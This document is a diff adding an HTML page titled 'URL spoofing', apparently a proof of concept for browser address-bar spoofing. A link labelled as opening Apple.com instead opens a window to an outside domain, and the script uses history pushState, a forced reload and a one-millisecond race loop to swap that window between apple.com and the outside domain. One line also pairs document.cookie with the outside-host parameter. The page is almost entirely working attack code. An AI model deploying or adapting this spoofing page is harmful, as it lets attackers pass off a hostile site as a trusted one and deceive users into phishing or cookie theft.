@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URL spoofing</title>
+</head>
+<body>
+    <a href="javascript:window.open('https://apple.com','x');" onclick="startSpoof('hm')">Click here to Open Apple.com</a>
+    <script>
+    var url_string = window.location.href;
+    var url = new URL(url_string);
+    var c = url.searchParams.get("redirection");
+    if(c=='true'){
+        setTimeout(function(){  
+            window.history.pushState({},'', '/test/new.html');
+            startSpoof(); 
+        }, 1000);
+    }
+    console.log(c);
+        let windowSpoof;
+        function race() {
+          try {
+            windowSpoof.location.href !== 'about:blank?d='+document.cookie;
+          }
+          catch (e) {
+              windowSpoof.location.href='https://apple.com/' ;
+               windowSpoof.location.href='https://techyfly.xyz/?d=';
+          }
+        }
+        
+        function startSpoof(e) {
+           
+           windowSpoof = window.open("https://techyfly.xyz/?d="+e,"x");
+           window.history.pushState({},'', '/test/new.html?redirection=true');
+             location.reload();
+          setInterval('race()', 1);
+        }
+        </script>
+</body>
+</html>
